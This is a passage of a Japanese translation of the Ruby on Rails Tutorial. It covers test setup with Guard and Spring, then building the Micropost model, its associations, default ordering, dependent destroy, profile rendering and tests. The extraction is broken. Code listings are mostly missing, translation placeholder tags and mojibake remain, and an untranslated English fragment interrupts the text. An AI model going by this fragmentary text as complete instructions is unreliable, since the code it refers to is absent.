特に「Ruby on Rails Tutorial Sample App」を全てのタイトルテストでそのまま使っています。専用の\kode{setup}関数 (テストの設定用関数、個別のテストの前に必ず毎回実行される) を使用してこの重複を解消し、テスト修正後もリスト\ref{code:base_title_test}のテストが \passing になることを確認します
(なお、リスト\ref{code:base_title_test}では\emph{インスタンス変数} (\ref{sec:mvc_in_action}と\ref{sec:a_user_class}) と\emph{文字列の式展開} (\ref{sec:strings}を使用しています)。
サンプルアプリケーションにContact (問い合わせ先) ページを作成してください。
この演習は\ref{sec:contact_page}の節に解答があります。
\ref{sec:green}でAboutページにやったのと同じように、Contactページにもリスト\ref{code:proposed_contact_page}のコンテンツを表示しましょう
(リスト\ref{code:proposed_contact_page}にはリスト\ref{code:base_title_test}のような修正は行われていないので、そのままコピペしても動きません)。
基本タイトルを含めたStaticPagesコントローラのテスト
Contactページで使用するコード
この追加の節は、\href{http://screencasts.railstutorial.org/}{Ruby on Railsチュートリアルスクリーンキャストシリーズ} (原著者の主催する有料スクリーンキャスト: 英語のみ) で使用するテスト用設定について解説します。
大きく3つに分かれます: 高度なパス/失敗表示 (\ref{sec:minitest_reporters})、テスト失敗時の大量のバックトレースメッセージをフィルタするユーティリティ (\ref{sec:backtrace_silencer})、ファイルの変更を検出して、必要なテストだけを自動実行してくれる「自動テスト実行ユーティリティ」(\ref{sec:guard})。
この節で参考までに示したコードはそれなりに高度なので、今すぐ理解できるようになる必要はありません。
この節の変更はmasterブランチで行う必要があります。
リスト\ref{code:minitest_reporters}のコードには、シングルクオーテーション (') とダブルクオーテーション (") の両方が含まれています。
Rubyでは、この2つのクオーテーションを併用することが一般的です。詳しくは\ref{sec:strings}で解説します。
これはリスト\ref{code:gemfile_sample_app}で使用されていました。
テストが失敗した時に、テスト失敗の道筋をアプリケーション全体にわたってたどるスタックトレース (バックトレース) が表示されます。
バックトレースは問題を追跡するうえでは非常に便利なのですが、クラウドIDEなど一部のシステムでは、このトレースがgemの依存関係やRails自身にまで及ぶことがあります。
そうなると大量のスタックトレースが出力されて非常に不便です。gemの依存関係を調べているのでもなければ、開発しているアプリケーションで問題の原因を追跡中に大量のメッセージが出力されても、邪魔なだけです。
こうした不要な出力行を除去するために、バックトレースをフィルタします
これを行うには\href{https://github.com/metaskills/mini_backtrace}{\texttt{mini\_backtrace}} gem (リスト\ref{code:gemfile_sample_app}) と\emph{backtrace silencer}を組み合わせます。
クラウドIDEの場合、そうした不要な行ではほとんどの場合\kode{rvm} (=Ruby Version Manager) という文字がパスに含まれているので、これを利用してフィルタします (リスト\ref{code:backtrace_silencer})。
RVMをフィルタするbacktrace silencerを追加する
# Be sure to restart your server when you modify this file.
# Rails.backtrace_cleaner.remove_silencers!
リスト\ref{code:backtrace_silencer}のコメント冒頭にあるように、backtrace silencerを追加した後は必ずRails webサーバーを再起動してください。
\kode{rake test}コマンドは、テストをする度にコマンドラインに移動して手動でコマンドを実行しなければならない点が面倒です。
この不便さを取り除くために、\href{https://github.com/guard/guard}{\emph{Guard}}を使ってテストを自動的に実行させるようにしてみましょう。
Guardは、ファイルシステムの変更を監視し、たとえば\kode{static\_pages\_test.rb}ファイルなどを変更すると自動的にテストを実行してくれるツールです。
$ bundle exec guard init<n>Writing new Guardfile to /home/ubuntu/workspace/sample_app/Guardfile<n>00:51:32 - INFO - minitest guard added to Guardfile, feel free to edit it
統合テストとビューが更新されたら自動的に適切なテストが実行されるように、生成された\kode{Guardfile}を編集します (リスト\ref{code:guardfile})。
(やや長くて応用的な設定なので、リスト\ref{code:guardfile}をコピペしてしまった方がよいでしょう)
カスタマイズした\kode{Guardfile}.
# Defines the matching rules for Guard.
上のコードにある以下の行にご注目ください。
この行ではGuardからSpringサーバーを使用して読み込み時間を短縮しています (SpringはRailsの機能のひとつです)。また、開始時にテストスイートをフルで実行しないようGuardに指示しています。
Guard使用時のSpringとGitの競合を防ぐには、\kode{.gitignore}ファイルに\kode{spring/}ディレクトリを追加します。.gitignoreはGitの設定ファイルのひとつで、ここで指定されたファイルはGitレポジトリに追加されなくなります。
クラウドIDEでは以下の操作を行います。
ナビゲーションパネルの右上のにある歯車アイコンをクリックします (図\ref{fig:file_navigator_gear_icon})。
[Show hidden files] を選択して、アプリケーションのルートディレクトリにある\kode{.gitignore}ファイルを表示します (図\ref{fig:show_hidden_files}).
\kode{.gitignore}ファイル (図\ref{fig:gitignore}) をダブルクリックして開き、リスト\ref{code:gitignore_spring}のように更新します。
ファイルナビゲーターにある (あまり目立たない) ギアのアイコン
ファイルナビゲーター内の隠しファイルを表示する
隠れている\kode{.gitignore}ファイルを表示する
\kode{.gitignore}にSpringを追加する
# See https://help.github.com/articles/ignoring-files for more about ignoring<n># files.
<n>#<n># If you find yourself ignoring temporary files generated by your text editor<n># or operating system, you probably want to add a global ignore instead:<n>#   git config --global core.excludesfile '~/.gitignore_global'<n><n># Ignore bundler config.
<n>/.bundle<n><n># Ignore the default SQLite database.
<n>/db/*.sqlite3<n>/db/*.sqlite3-journal<n><n># Ignore all logfiles and tempfiles.
<n>/log/*.log<n>/tmp<n><n># Ignore Spring files.
Springサーバーは本節の執筆時点では若干不安定な点が残っていて、Springの\emph{プロセス}が起動したまま多数残留すると、テストのパフォーマンスが低下してしまうことがあります。
Unixのプロセス
LinuxやOS XなどのUnix系システムは、ユーザータスクやシステムタスクは\emph{プロセス (process)} と呼ばれる一種のコンテナの内部で実行されます。
システム上で動いているすべてのプロセスは、\texttt{ps}コマンドに\texttt{aux}オプションを付けて実行することで確認できます。
  $ ps aux
プロセスの種類を指定してフィルタするには、\texttt{ps}の結果をUnixの「パイプ」\texttt{|}でつないで、パターンマッチャーである\texttt{grep}に渡します。
  $ ps aux | grep spring<n>  ubuntu 12241 0.3 0.5 589960 178416 ?
Ssl Sep20 1:46<n>  spring app | sample_app | started 7 hours ago
表示結果の中で重要なのは最初の列の数値です。これは\emph{プロセスid}、略してpidと呼ばれるものです。
不要なプロセスを排除するには、\texttt{kill}コマンドでpidを指定し、Unixのkillコード (\href{https://en.wikipedia.org/wiki/Unix_signal#List_of_signals}{ここでは9ですがシステムによって異なります}) を発行します。
行儀の悪いRailsサーバーなどのプロセスをkillする際には、上のようにひとつずつkillすることをおすすめします。Railsサーバーのpidを知るには、\texttt{ps aux | grep server})などと実行します。しかし時には特定の名前を持つプロセスをまとめてkillしたいこともあります。しつこい\texttt{spring}プロセスたちをひとつずつkillするのは大変面倒です。
一括killを行うには、最初に\texttt{spring}コマンドそのものでプロセスを停止しておく必要があります。
  $ spring stop
このコマンドが効かないことも多いので、そのときはいよいよ\texttt{pkill}コマンドで\texttt{spring}の名前を指定してkillします。
Guardの設定が完了したら、新しいターミナルを開き (\ref{sec:rails_server}でやったようにRailsサーバーのターミナルと別にするのがポイントです)、以下をコマンドラインで実行します
$ bundle exec guard
リスト\ref{code:guardfile}のルールは本チュートリアルに最適化したものなので、たとえばコントローラのファイルを変更すると、Guardは即座にそれを検出して、そのコントローラの統合テストを自動実行します。
テストを変更ファイルだけではなく、\emph{フル}で実行したい場合は、\kode{guard>}プロンプトでReturnキーを押します
(このとき、Springサーバーに接続できないなどのエラーが表示されることがあります。
問題を修正するには、もう一度Returnキーを押します)。
Guardを終了するにはCtrl-Dキーを押します。Guardに他のマッチャーを追加する方法については、リスト\ref{code:guardfile}の例、\href{https://github.com/guard/guard}{Guard README}、\href{https://github.com/guard/guard/wiki}{Guard wiki}を参照してください。
サンプルアプリケーションのコア部分を開発するために、これまでにユーザー、セッション、アカウント有効化、パスワードリセットという４つのリソースについて見てきました。そして、これらのうち「ユーザー」というリソースだけが、Active Recordによってデータベース上のテーブルと紐付いています。
全ての準備が整った今、ユーザーが短いメッセージを投稿できるようにするためのリソース「\emph{マイクロポスト}」を追加していきます
この名前はTwitterの\emph{マイクロブログ}という説明分から着想を得ました。ブログにはポストがあるので、マイクロブログがあればマイクロポストもある、といった具合です。
第\ref{cha:a_toy_app}章で簡易的なマイクロポスト投稿フォームに触れましたが、この章では、\ref{sec:microposts_resource}で記述したMicropostデータモデルを作成し、Userモデルと\kode{has\_many}および\kode{belongs\_to}メソッドを使って関連付けを行い、さらに、結果を処理し表示するために必要なフォームとその部品を作成します (\ref{sec:micropost_images}で画像のアップロードも実装します)。
第\ref{cha:following_users}章では、マイクロポストの\emph{フィード}を受け取るために、ユーザーを\emph{フォロー}するという概念を導入し、Twitterのミニクローンを完成させます。
<n><n>  \section{Micropostモデル} % (fold)<n>  \label{sec:a_micropost_model}<n><n>
まずはMicropostリソースの最も本質的な部分を表現するMicropostモデルを作成するところから始めましょう。
\ref{sec:microposts_resource}で作成したモデルと同様に、この新しいMicropostモデルもデータ検証とUserモデルの関連付けを含んでいます。
以前のモデルとは違って、今回のマイクロポストモデルは完全にテストされ、デフォルトの\emph{順序}を持ち、また親であるユーザーが破棄された場合には自動的に\emph{破棄}されるようにします。
Git をバージョン管理に使っている場合は、いつものようにトピックブランチを作成しておきましょう。
user-microposts
<n>\end{code}<n><n>    \subsection{基本的なモデル} % (fold)<n>    \label{sec:the_basic_model}<n><n>
Micropostモデルは、マイクロポストの内容を保存する\kode{content}属性と、特定のユーザーとマイクロポストを関連付ける\kode{user\_id}属性の2つの属性だけを持ちます。
実行した結果のMicropostモデルの構造は図\ref{fig:micropost_model}のようになります。
Micropostデータモデル
図\ref{fig:micropost_model}のモデルでは、マイクロポストの投稿に\kode{String}型ではなく\kode{text}型を使っている点に注目してください。これは、ある程度の量のテキストを格納するときに使われる型です。
\kode{String}型でも255文字までは格納できるため、この型でも\ref{sec:micropost_validations}で実装する140文字制限を満たせるのですが、\kode{Text}型の方が表現豊かなマイクロポストを実現できます。
たとえば、\ref{sec:creating_microposts}では投稿フォームにString用のテキストフィールドではなくてText用の\emph{テキストエリア}を使うため、より自然な投稿フォームが実現できます。
また、\kode{Text}型の方が将来における柔軟性に富んでいて、たとえばいつか国際化をするときに、言語に応じて投稿の長さを調節することもできます。
では、リスト\ref{code:generate_user_model}でUserモデルを生成したときと同様に、Railsの\kode{generate model}コマンドを使ってMicropostモデルを生成してみます。
リスト{p0}でデータベースに{2}users{/2}テーブルを作るマイグレーションファイルを生成した時と同様に、この{2}generate{/2}コマンドは{2}microposts{/2}テーブルを作成するためのマイグレーションファイルを生成します (リスト\ref{code:users_migration})。
外部参照キー参照は、データベースレベルでの制約です。これによって、Micropostsテーブルのuser_idは、Usersテーブルのidカラムを参照するようになります。
本チュートリアルでこの詳細が重要になることはありません。また、この外部キーによる制約は、すべてのデータベースで使えるわけではありません
(たとえばHerokuのPostgreSQLではサポートされていますが、開発用のSQLiteではサポートされていません)。
外部キーの詳細は\ref{sec:relationship_user_associations}で学びます。
Userモデルのときと同じで、Micropostモデルのマイグレーションファイルでも\kode{t.timestamps}という行 (マジックカラム) が自動的に生成されています。これにより、 \ref{sec:database_migrations}で説明したように\kode{created\_at}と\kode{updated\_at}というカラムが追加されます (図 \ref{fig:micropost_model})。
なお、\kode{created_at}カラムは、\ref{sec:ordering_and_dependency}や\ref{sec:rendering_microposts}の実装を進めていく上で必要なカラムです。
インデックスが付与されたMicropostのマイグレーション
\kode{user\_id}と\kode{created\_at}両方のカラムを1つの配列に含めることで、Active Recordで\emph{両方}のキーを同時に使用する\emph{複合キーインデックス}を作成できます。
それでは、リスト\ref{code:micropost_migration}をマイグレーション使って、いつものようにデータベースを更新してみましょう。
基本的なモデルを作成したので、次に要求される制限を実現するためのバリデーションを追加しましょう。
Micropostモデルを作成したときに、マイクロポストは投稿したユーザーのid (user_id) を持たせるようにしました。
これを使って、慣習的に正しくActive Recordの\emph{関連付け}を実装していきます (\ref{sec:user_micropost_associations}) が、まずは\kode{Micropost}モデル単体を (テスト駆動開発で) 動くようにしてみます。
Micropostの初期テストはUserモデルの初期テスト (リスト\ref{code:name_presence_test}) と似ています。
まずは\kode{setup}のステップで、fixtureのサンプルユーザーと紐付けた新しいマイクロポストを作成しています。次に、作成したマイクロポストが有効かどうかをチェックしてます。
最後に、あらゆるマイクロポストはユーザーのidを持っているべきなので、\kode{user\_id}の存在性のバリデーションに対するテストも追加します。
これらの要素を1つにまとめると、リスト\ref{code:micropost_validity_test}のようなテストコードになります。
新しいMicropostの有効性に対するテスト 
# このコードは慣用的な意味で正しくない。
\kode{setup}メソッドの中でコメントしているとおり、マイクロポストを作成するコードは動きますが、慣習的には正しくありません (\ref{sec:user_micropost_associations}で修正します)。
これを修正するためには、ユーザーidに対するバリデーションを追加する必要があります (リスト\ref{code:micropost_user_id_validation})。
なお、リスト{p0}にはすでに{2}belongs_to{/2}というコードがありますが、これはリスト\ref{code:micropost_migration}のマイグレーションによって自動的に生成されたコードです。
この行の意味については、\ref{sec:user_micropost_associations}で説明します。
マイクロポストの\kode{user\_id}に対する検証 
これにより、モデルのテストは\passingするようになります。
次に、マイクロポストの\kode{content}属性に対するバリデーションを追加しましょう (\ref{sec:putting_the_micro_in_microposts}で紹介した例と同じです)。
\kode{user_id}属性と同様に、\kode{content}属性も存在する必要があり、さらに\emph{マイクロ}ポストが140文字より長くならないよう制限を加えます。
\ref{sec:user_validations}で使ったUserモデルのバリデーションを参考に、まずはこれらの制限を簡潔にテストしてみます。結果はリスト\ref{code:micropost_validations_tests}のとおりです。
Micropostモデルのバリデーションに対するテスト 
\ref{sec:user_validations}と同様で、リスト\ref{code:micropost_validations_tests}ではマイクロポストの長さをテストするために、文字列の乗算を使用しています。
=> "aaaaaaaaaa"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
これに対応するアプリケーション側の実装は、Userの\kode{name}用バリデーション (リスト\ref{code:length_validation}) と全く同じです。リスト\ref{code:micropost_validations}に結果を示します。
Micropostモデルのバリデーション 
Webアプリケーション用のデータモデルを構築するにあたって、個々のモデル間での\emph{関連付け}を十分考えておくことが重要です。
今回の場合は、 \ref{sec:demo_user_has_many_microposts}でも示したように、それぞれのマイクロポストは１人のユーザーと関連付けられ、それぞれのユーザーは (潜在的に) 複数のマイクロポストと関連付けられます。この関連付けを図\ref{fig:micropost_belongs_to_user}と図\ref{fig:user_has_many_microposts}に示します。
これらの関連付けを実装するための一環として、Micropostモデルに対するテストを作成し、さらにUserモデルにいくつかのテストを追加します。
}MicropostとそのUserは \kode{belongs\_to} (1対1) の関係性がある
UserとそのMicropostは \kode{has\_many} (1対多) の関係性がある
この節で定義する\kode{belongs\_to}/\kode{has\_many}関連付けを使用することで、表\ref{table:association_methods}に示すようなメソッドをRailsで使えるようになります。
表\ref{table:association_methods}では、以下のメソッドではなく
これらのメソッドは使うと、紐付いているユーザーを\emph{通して}マイクロポストを作成することができます (慣習的に正しい方法です)。
新規のマイクロポストがこの方法で作成される場合、\kode{user\_id}は自動的に正しい値に設定されます。
この方法を使うと、たとえば以下のような
という書き方 (リスト\ref{code:micropost_validity_test}) が、以下のように書き換えられます。
(\kode{new}メソッドと同様に、\kode{build}メソッドはオブジェクトを返しますがデータベースには反映されません。)
一度正しい関連付けを定義してしまえば、\kode{@micropost}変数の\kode{user\_id}には、関連するユーザーのidが自動的に設定されます。
Micropostに紐付いたUserオブジェクトを返す
Userのマイクロポストの集合をかえす
\kode{user}に紐付いたマイクロポストを作成する
\kode{user}に紐付いたマイクロポストを作成する (失敗時に例外を発生)
\kode{user}に紐付いた新しいMicropostオブジェクトを返す
\kode{user}に紐付いていて、\kode{id}が\kode{1}であるマイクロポストを検索する
user/micropost関連メソッドのまとめ
\kode{@user.microposts.build}のようなコードを使うためには、 UserモデルとMicropostモデルをそれぞれ更新して、関連付ける必要があります。
Micropostモデルの方では、\kode{belongs\_to :user}というコードが必要になるのですが、これは リスト\ref{code:micropost_belongs_to_user}のマイグレーションによって自動的に生成されているはずです (リスト\ref{code:micropost_belongs_to_user})。
マイクロポストがユーザーに所属する (\kode{belongs\_to}) 関連付け 
ユーザーがマイクロポストを複数所有する (\kode{has\_many}) 関連付け 
正しく関連付けができたら、リスト\ref{code:micropost_validity_test}の\kode{setup}メソッドを修正して、慣習的に正しくマイクロポストを作成してみます (リスト\ref{code:micropost_validity_test_idiomatic})。
慣習的に正しくマイクロポストを作成する 
もちろん、些細なリファクタリングでしかないので、テストは\passingしたままになっているはずです。
この項では、UserとMicropostの関連付けを改良していきます。
具体的には、ユーザーのマイクロポストを特定の\emph{順序}で取得できるようにしたり、マイクロポストをユーザーに\emph{依存させて}、ユーザーが削除されたらマイクロポストも自動的に削除されるようにしていきます。
デフォルトのスコープ
\kode{user.microposts}メソッドはデフォルトでは読み出しの順序に対して何も保証しませんが、 ブログやTwitterの慣習に従って、作成時間の逆順、つまり最も新しいマイクロポストを最初に表示するようにしてみましょう
ユーザー一覧を実装するときも (\ref{sec:updating_and_deleting_users_conclusion})、似たような問題にぶつかりました。
これを実装するためには、\emph{default scope}というテクニックを使います。
この機能のテストは、見せかけの成功に陥りやすい部分で、「アプリケーション側の実装が本当は間違っているのにテストが成功してしまう」という罠があります。正しいテストを書くために、ここではテスト駆動開発で進めていきます。
具体的には、まずデータベース上の最初のマイクロポストが、fixture内のマイクロポスト (\kode{most\_recent}) と同じであるか検証するテストを書いていきましょう (リスト\ref{code:micropost_order_test})。
マイクロポストの順序付けをテストする 
リスト\ref{code:micropost_order_test}では、マイクロポスト用のfixtureファイルからサンプルデータを読み出しているので、次のfixtureファイルも必要になります (リスト\ref{code:micropost_fixtures})。
マイクロポスト用のfixture
ここでは、埋め込みRubyを使って\kode{created\_at}カラムに明示的に値をセットしている点に注目してください。
このマジックカラムはRailsによって自動的に更新されるため、基本的には手動で更新することはできないのですが、fixtureファイルの中ではそれが可能になっています。
また、原理的には必要はないかもしれませんが、ほとんどのシステムでは上から順に作成されるので、fixtureファイルでも意図的に順序をいじっています。
たとえば、ファイル内の一番下のサンプルデータは最後に生成されるので、最も新しい投稿になるように修正する、といった感じです。ただ、この振る舞いは恐らくシステムに依存していて崩れやすいので、(本来は) この振る舞いに依存したテストは書くべきでは無いでしょう。
このコードはリスト\ref{code:micropost_order_test}で使用されていました。もうひとつ、
次に、Railsの\kode{default\_scope}メソッドを使ってこのテストを成功させます。このメソッドは、データベースから要素を取得したときの、デフォルトの順序を指定するメソッドです。
特定の順序にしたい場合は、\kode{default\_scope}の引数に\kode{order}を与えます。たとえば、\kode{created\_at}カラムの順にしたい場合は次のようになります。
順序を逆にしたい場合は、一段階低いレベルの技術ではありますが、次のように生のSQLを引数に与える必要があります。
SQLは大文字小文字を区別しませんが、慣習的にSQLのキーワード ( \kode{DESC}など) は大文字で書くことになっています。
古いバージョンのRailsでは、欲しい振る舞いにするためには生のSQLを書くしか選択肢がなかったのですが、Rails 4.0からは次のようにRubyの文法でも書けるようになりました。
このコードを使ってMicropostモデルを更新した結果を、リスト\ref{code:micropost_ordering}に示します。
\kode{default\_scope}ででマイクロポストを順序付ける 
リスト\ref{code:micropost_ordering}では新たに、ラムダ式 (Stabby lambda) という文法を使っています。これは、\emph{Proc}や\emph{lambda} (もしくは\emph{無名関数})と呼ばれるオブジェクトを作成する文法です。
\kode{->}というラムダ式は、ブロック (\ref{sec:blocks}) を引数に取り、Procオブジェクトを返します。このオブジェクトは、\kode{call}メソッドが呼ばれたとき、ブロック内の処理を評価します。
この構文をコンソールで確かめてみましょう。
=> #<Proc:0x007fab938d0108@(irb):1 (lambda)>
(ProcやRubyのトピックとしてはやや高度な部類に含まれるので、今すぐわからなくても心配する必要はありません。)
リスト\ref{code:micropost_ordering}のコードを追加することで、テストスイートは \passing になるはずです。
Dependent: destroy
順序についてはひとまずここで区切ることにし、今度はマイクロポストに第二の要素を追加してみましょう。
\ref{sec:deleting_users}で書いたように、サイト管理者はユーザーを\emph{破棄する}権限を持ちます。
ユーザーが破棄された場合、ユーザーのマイクロポストも同様に破棄されるべきです。
この振る舞いは、\kode{has\_many}メソッドにオプションを渡してあげることで実装できます (リスト\ref{code:micropost_dependency})。
マイクロポストは、その所有�者 (ユーザー) と一緒に破棄されることを保証する
\kode{dependent: :destroy}というオプションを使うと、ユーザーが削除されたときに、そのユーザーに紐付いた (そのユーザーが投稿した) マイクロポストも一緒に削除されるようになります。
これは、管理者がシステムからユーザーを削除したとき、持ち主の存在しないマイクロポストがデータベースに取り残されてしまう問題を防ぎます。
次に、リスト\ref{code:micropost_dependency}が正しく動くかどうか、テストを使ってUserモデルを検証してみます。
このテストでは、 (idを紐づけるための) ユーザーを作成することと、そのユーザーに紐付いたマイクロポストを作成する必要があります。
その後、ユーザーを削除してみて、マイクロポストの数が1つ減っているかどうかを確認します。
作成したコードをリスト\ref{code:dependent_destroy_test}に示します
([delete] リンクの統合テスト (リスト\ref{code:delete_link_integration_test}) と比較してみてください。)
\kode{dependent: :destroy}のテスト 
リスト\ref{code:micropost_dependency}のコードが正しく動いていれば、テストが \passing するようになります。
Web経由でマイクロポストを作成する方法は現時点ではありませんが (\ref{sec:creating_microposts}から作り始めます)、マイクロポストを表示することと、テストすることならできます。
ここでは、Twitterのような独立したマイクロポストの\kode{index}ページは作らずに、図\ref{fig:user_microposts_mockup}のモックアップに示したように、ユーザーの\kode{show}ページで直接マイクロポストを表示させることにします。
ユーザープロフィールにマイクロポストを表示させるため、最初に極めてシンプルなERbテンプレートを作成します。次に、\ref{sec:sample_users}のサンプルデータ生成タスクにマイクロポストのサンプルを追加して、画面にサンプルデータが表示されるようにしてみます。
マイクロポストが表示されたプロフィールページのモックアップ
\label{fig:user_microposts_mockup}}<n>\end{figure}<n><n>    \subsection{マイクロポストの描画} % (fold)<n>    \label{sec:rendering_microposts}<n><n>Our plan is to display the 
とはいえ、今回必要となるアイデアのほとんどは、\ref{sec:showing_all_users}で実装したユーザーを表示する部分と似ています。
まずは、Micropostのコントローラとビューを作成するために、コントローラを生成しましょう (今回必要なのはビューだけで、Micropostsコントローラは\ref{sec:manipulating_microposts}まで使いません)。
今回の目的は、ユーザー毎にすべてのマイクロポストを描画できるようにすることです。
\ref{sec:partial_refactoring}で見た次のコードでは、
まずは、順序無しリストの \emph{ul}タグではなく、\kode{順序付き}リストの\emph{ol}タグを使っている点に注目してください。これは、マイクロポストが特定の順序 (新しい→古い) に依存しているためです。
次に、対応するパーシャルをリスト\ref{code:micropost_partial}に示します。
1つのマイクロポストを表示するパーシャル
</span>
ここでは\kode{time\_ago\_in\_words}というヘルパーメソッドを使っています。これはメソッド名の表すとおりですが、「3分前に投稿」といった文字列を出力します。具体的な効果について\ref{sec:sample_microposts}で説明します。
また、リスト\ref{code:micropost_partial}では各マイクロポストに対してCSSのidを割り振っています。
これは一般的に良いとされる慣習で、たとえば将来、JavaScriptを使って各マイクロポストを操作したくなったときなdに役立ちます。
次は、一度にすべてのマイクロポストが表示されてしまう潜在的問題に対処します。
\ref{sec:pagination}ではページネーションを使いましたが、今回も同じ方法でこの問題を解決します。
前回同様、\kode{will\_paginate}メソッドを使うと次のようになります。
リスト\ref{code:will_paginate_index_view}のユーザー一覧画面のコードと比較すると、少し違っています。。以前は次のように単純なコードでした。
実は、上のコードは引数なしで動作していました。これは\kode{will\_paginate}が、Usersコントローラのコンテキストにおいて、\kode{@users}インスタンス変数が存在していることを\emph{前提としている}ためです。このインスタンス変数は、\ref{sec:pagination}でも述べたように\kode{ActiveRecord::Relation}クラスのインスタンスです。
もちろん、そのような変数をユーザー\kode{show}アクションで定義しなければなりません (リスト\ref{code:user_show_microposts_instance})。
\kode{@microposts}インスタンス変数を\kode{show}アクションに追加する
\kode{paginate}メソッドの素晴らしさに注目してください。\emph{マイクロポストの関連付けを経由して}\texttt{micropost}テーブルに到達し、必要なマイクロポストのページを引き出してくれます。
最後の課題はマイクロポストの投稿数を表示することですが、これは\kode{count}メソッドを使うことで解決できます。
\kode{paginate}と同様に、関連付けをとおして\kode{count}メソッドを呼び出すことができます。
大事なことは、\kode{count}メソッドではデータベース上のマイクロポストを全部読みだしてから結果の配列に対して\kode{length}を呼ぶ、といった無駄な処理は\emph{していない}という点です。そんなことをしたら、マイクロポストの数が増加するにつれて効率が低下してしまいます。
そうではなく、(データベース内での計算は高度に最適化されいるので) データベースに代わりに計算してもらい、特定の\kode{user\_id}に紐付いたマイクロポストの数をデータベースに問い合わせています。
(それでもcountメソッドがアプリケーションのボトルネックになるようなことがあれば、さらに高速な\href{http://railscasts.com/episodes/23-counter-cache-column}{\emph{counter cache}}を使うこともできます。)
これですべての要素が揃ったので、プロフィール画面にマイクロポストを表示させてみましょう (リスト\ref{code:user_show_microposts})。
(このとき、リスト\ref{code:errors_partial}と同様に \kode{if @user.microposts.any?}\ を使って、ユーザーのマイクロポストが1つもない場合には空のリストを表示させていない点にも注目してください。)
マイクロポストをユーザーの\kode{show}ページ (プロフィール画面) に追加する
ここで、改良した新しいプロフィール画面をブラウザで見てみましょう (図\ref{fig:user_profile_no_microposts}) をブラウザで見てみましょう
マイクロポストが1つもないのでは無理もありません。
ではここでマイクロポストを追加しましょう。
マイクロポスト用のコードのあるユーザープロフィールページ (ただしマイクロポストがない)
\ref{sec:rendering_microposts}のユーザーマイクロポストのテンプレート作成作業の成果は、何とも拍子抜けでした。
\ref{sec:sample_users}のサンプルデータ生成タスクにマイクロポストも追加して、この情けない状況を修正しましょう。
\emph{すべての}ユーザーにマイクロポストを追加しようとすると時間が掛かり過ぎるので、\kode{take}メソッドを使って最初の6人だけに追加します。
もしこのメソッドが生成するSQLに興味があるのであれば、\kode{log/development.log}をtailしてみてください (コマンドラインでファイルにtailコマンドを実行するという意味)。
(このとき、\kode{order}メソッドを経由することで、明示的に最初の (IDが小さい順に) 6人を呼び出すようにしています。)
この6人については、1ページの表示限界数 (30) を越えさせるために、それぞれ50個分のマイクロポストを追加するようにしています。
これはリスト\ref{code:sample_microposts}で使用されていました。
(リスト\ref{code:sample_microposts}のループの順序に違和感があるかもしれませんが、これは\ref{sec:the_status_feed}でステータスフィード (いわゆるタイムライン) を実装するときに役立ちます。
というのも、ユーザー毎に50個分のマイクロポストをまとめて作成してしまうと、ステータスフィードに表示される投稿がすべて同じユーザーになってしまい、視覚的な見栄えが悪くなるからです。)
サンプルデータにマイクロポストを追加する
ここで、いつものように開発環境用のデータベースで再度サンプルデータを生成します。
生成し終わったら、Railsサーバーを一度落として、起動し直してください。
Faker gemの\emph{lorem ipsum}サンプルテキストはランダムに生成される仕様になっているため、サンプルマイクロポストの内容はこの図と違っているはずです。
ユーザープロフィールとスタイルのないマイクロポスト
図\ref{fig:user_profile_microposts_no_styling}のページにはマイクロポスト固有のスタイルが与えられていないので、リスト\ref{code:micropost_css}を追加して、結果のページを見てみましょう
便宜上、リスト\ref{code:micropost_css}はこの章で必要なCSSを\emph{すべて}含んでいます。
マイクロポスト用のCSS (本章で利用するCSSのすべて)
図\ref{fig:user_profile_with_microposts}では最初のユーザーのプロフィール画面を、図\ref{fig:other_profile_with_microposts}では2番目のユーザーのプロフィール画面を表示しています。
最後の図\ref{fig:user_profile_microposts}では、最初のユーザーの\emph{2番目}のページと、下部にあるページネーションのリンクを表示しています。
各マイクロポストの表示には、3つのどの場合にも、それが作成されてからの時間 ("1分​​前に投稿" など) が表示されていることに注目してください。これはリスト\ref{code:micropost_partial}の\kode{time\_ago\_in\_words}メソッドによるものです。
数分待ってからページを再度読み込むと、このテキストは自動的に新しい時間に基づいて更新されます。
{0}図11.7{/0} {1}ユーザープロフィール (\href{http://localhost:3000/users/1}{/users/1}) とマイクロポスト{/1}
{0}図11.8{/0} {1}別ユーザーのプロフィールとマイクロポスト (\href{http://localhost:3000/users/5}{/users/5}){/1}
アカウントを有効化したばかりのユーザーはプロフィール画面にリダイレクトされるので、そのプロフィール画面が正しく描画されていることは、単体テストを通して確認済みです (リスト\ref{code:signup_with_account_activation_test})。
この項では、プロフィール画面で表示されるマイクロポストに対して、統合テストを書いていきます。
まずは、プロフィール画面用の統合テストを生成してみましょう。
プロフィール画面におけるマイクロポストをテストするためには、ユーザーに紐付いたマイクロポストのテスト用データが必要になります。
Railsの慣習に従って、関連付けされたテストデータをfixtureファイルに追加すると、次のようになります。
\kode{user}に\kode{michael}という値を渡すと、Railsはfixtureファイル内の対応するユーザーを探し出して、(もし見つかれば) マイクロポストに関連付けてくれます。
また、マイクロポストのページネーションをテストするためには、マイクロポスト用のfixtureにいくつかテストデータを追加する必要がありますが、これはリスト\ref{code:users_fixtures_extra_users}でユーザーを追加したときと同様に、埋め込みRubyを使うと簡単です。
これらのコードを1つにまとめると、マイクロポスト用のfixtureファイルはリスト\ref{code:updated_micropost_fixtures}のようになります。
ユーザーと関連付けされたマイクロポストのfixture
テストデータの準備は完了したので、これからテストを書いていきますが、今回のテストはやや単純です。今回のテストでは、プロフィール画面にアクセスした後に、ページタイトルとユーザー名、Gravatar、マイクロポストの投稿数、そしてページ分割されたマイクロポスト、といった順でテストしていきます。
作成したコードをリスト\ref{code:user_profile_test}に示します
(Applicationヘルパーをインクルードすることで、リスト\ref{code:title_helper}の\kode{full\_title}ヘルパーが利用できている点に注目してください)。
もし\kode{full\_title}ヘルパーを使って他のテストもリファクタリングしたくなったら (例えばリスト\ref{code:base_title_test}など)、\kode{test\_helper.rb}からApplicationヘルパーをインクルードしてください。
Userプロフィール画面に対するテスト
リスト\ref{code:user_profile_test}ではマイクロポストの投稿数をチェックするために、\kode{{1}第10章{/1}}の演習(\ref{cha:account_activation_and_password_reset})で紹介した{4}response.body{/4}を使っています。
名前を見ると誤解されがちですが、\kode{response.body}にはそのページの完全なHTMLが含まれています (HTMLのbodyタグだけではなありません)。
したがって、そのページの\emph{どこかしらに}マイクロポストの投稿数が存在するのであれば、次のように探し出してマッチできるはずです。
これは\kode{assert\_select}よりもずっと抽象的なメソッドです。特に、 \kode{assert\_select}ではどのHTMLタグを探すのか伝える必要がありますが、\kode{assert\_match}メソッドではその必要がない点が違います。
